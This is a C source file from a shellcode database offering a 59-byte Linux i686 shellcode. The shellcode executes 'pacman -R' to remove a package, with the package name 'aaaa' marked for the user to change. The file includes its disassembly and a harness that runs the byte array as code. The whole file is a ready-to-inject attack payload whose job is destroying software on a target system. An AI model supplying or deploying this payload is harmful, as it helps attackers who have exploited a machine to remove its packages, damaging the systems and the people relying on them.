/*
 Title	: Linux i686 - pacman -R <package> - 59 bytes
 Author	: Jonathan Salwan
 Mail	: submit [!] shell-storm.org
 Web	: http://www.shell-storm.org

 Pacman is a software package manager, developed as part of the Arch Linux distribution.
 With this shellcode you can remove the packages.

	! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ !


 Disassembly of section .text:

 08048054 <.text>:
 8048054:	31 c0                	xor    %eax,%eax
 8048056:	31 db                	xor    %ebx,%ebx
 8048058:	31 c9                	xor    %ecx,%ecx
 804805a:	31 d2                	xor    %edx,%edx
 804805c:	31 f6                	xor    %esi,%esi
 804805e:	52                   	push   %edx
 804805f:	68 61 61 61 61       	push   $0x61616161
 8048064:	89 e6                	mov    %esp,%esi
 8048066:	52                   	push   %edx
 8048067:	66 68 2d 52          	pushw  $0x522d
 804806b:	89 e1                	mov    %esp,%ecx
 804806d:	52                   	push   %edx
 804806e:	68 63 6d 61 6e       	push   $0x6e616d63
 8048073:	68 6e 2f 70 61       	push   $0x61702f6e
 8048078:	68 72 2f 62 69       	push   $0x69622f72
 804807d:	68 2f 2f 75 73       	push   $0x73752f2f
 8048082:	89 e3                	mov    %esp,%ebx
 8048084:	52                   	push   %edx
 8048085:	56                   	push   %esi
 8048086:	51                   	push   %ecx
 8048087:	53                   	push   %ebx
 8048088:	89 e1                	mov    %esp,%ecx
 804808a:	b0 0b                	mov    $0xb,%al
 804808c:	99                   	cltd
 804808d:	cd 80                	int    $0x80

*/


#include <stdio.h>

int main(void)
{
char shellcode[] =

			"\x31\xc0\x31\xdb\x31\xc9\x31"
			"\xd2\x31\xf6\x52\x68"
			"\x61\x61\x61\x61"		// <- package is "aaaa", you can change it.
			"\x89\xe6\x52\x66\x68\x2d\x52"
			"\x89\xe1\x52\x68\x63\x6d\x61"
			"\x6e\x68\x6e\x2f\x70\x61\x68"
			"\x72\x2f\x62\x69\x68\x2f\x2f"
			"\x75\x73\x89\xe3\x52\x56\x51"
			"\x53\x89\xe1\xb0\x0b\x99\xcd"
			"\x80";

       	printf("Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();

return 0;
}